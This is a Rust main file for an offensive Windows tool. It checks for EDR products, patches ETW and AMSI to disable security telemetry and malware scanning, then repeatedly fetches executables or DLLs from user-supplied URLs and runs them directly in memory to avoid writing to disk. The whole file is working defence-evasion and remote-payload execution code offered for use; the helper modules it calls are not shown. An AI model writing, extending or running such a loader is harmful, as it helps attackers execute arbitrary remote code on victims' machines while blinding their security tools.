use url::Url;
use memexec;
use colored::Colorize;
use ctrlc;
use memexec::peparser::PE;
use memexec::peloader::def::DLL_PROCESS_ATTACH;

mod patcher;
mod error;
mod detector;
mod fetch;

#[tokio::main]
async fn main(){
    ctrlc::set_handler(move || {
        eprintln!("\n[i] Received {}!", "Ctrl+C".red());
        std::process::exit(0);
    }).expect("[!] Error setting Ctrl-C handler");

    println!("[>] {}? {}!", "Executables on Disk".italic().red(), "Ew".yellow());
    println!("[i] Checking for popular {}", "EDRs".purple());
    if detector::detect_edrs() {
        eprintln!("[!] EDRs {}", "detected!".red());
    }
    else {
        println!("[i] {} detected!", "No External EDRs".cyan());
    }

    // Patch ETW
    match patcher::patch_etw(){
        Ok(_val) => {
            println!("[i] {} Patched!","ETW".yellow());
        },
        Err(e) => {
            let err_msg = format!("{}", e);
            eprintln!("[!] Failed to patch {}", "ETW".red());
            eprintln!("[!] Error occured as {}", err_msg.red());
        }
    };


    match patcher::patch_amsi(){
        Ok(_val) => {
            println!("[i] {} Patched!","AMSI".magenta());
        },
        Err(e) => {
            let err_msg = format!("{}", e);
            eprintln!("[!] Failed to patch {}", "AMSI".red());
            eprintln!("[!] Error occured as {}", err_msg.red());
        }
    };

    //etw::__check_mouse_pointer();
    
    //new_ntdll_patch_etw().expect("Patching not okie");
    
    loop {
        let url_str = match fetch::fetch_url(){
            Ok(_res) => _res,
            Err(e) => {
                let err = format!("{}", e);
                eprintln!("[!] Error occured as: {}", err.red());
                continue;
            },
        };

        // Check if user wants to exit
        if url_str.clone().as_str().trim().eq_ignore_ascii_case("quit") || 
            url_str.clone().as_str().trim().eq_ignore_ascii_case("exit") {
                break;
            }

        // Check for empty input
        if url_str.clone().as_str().trim().is_empty() {
            continue;
        }

        println!("[i] Fetching: {}", url_str.yellow());
        let url: Url = match Url::parse(url_str.as_str()) {
            Ok(_u) => _u,
            Err(e) => {
                eprintln!("[-] Failed to parse URL string");
                eprintln!("[-] Error: {}", e);
                continue;
            }
        };

        // Fetch PE
        let pe_buf = match fetch::fetch_pe(url).await  {
            Ok(_v) => _v,
            Err(e) => {
                let err = format!("{}",e);
                eprintln!("[!] Error occurred as: {}", err.red());
                continue;
            }
        };


        // Load PE 
        let pe_parse = PE::new(&pe_buf).unwrap();
        unsafe {
            if pe_parse.is_dll() {
                println!("[i] Running {}!", "DLL".green());
                memexec::memexec_dll(&pe_buf, 0 as _, DLL_PROCESS_ATTACH, 0 as _).expect("[!] Failed to attach DLL");
            }

            else {
                println!("[i] Running {}!", "PE".green());
                memexec::memexec_exe(&pe_buf).expect("[!] Failed to run Exe");
            }
        }


    }

    println!("[i] {}", "Bye".green());
}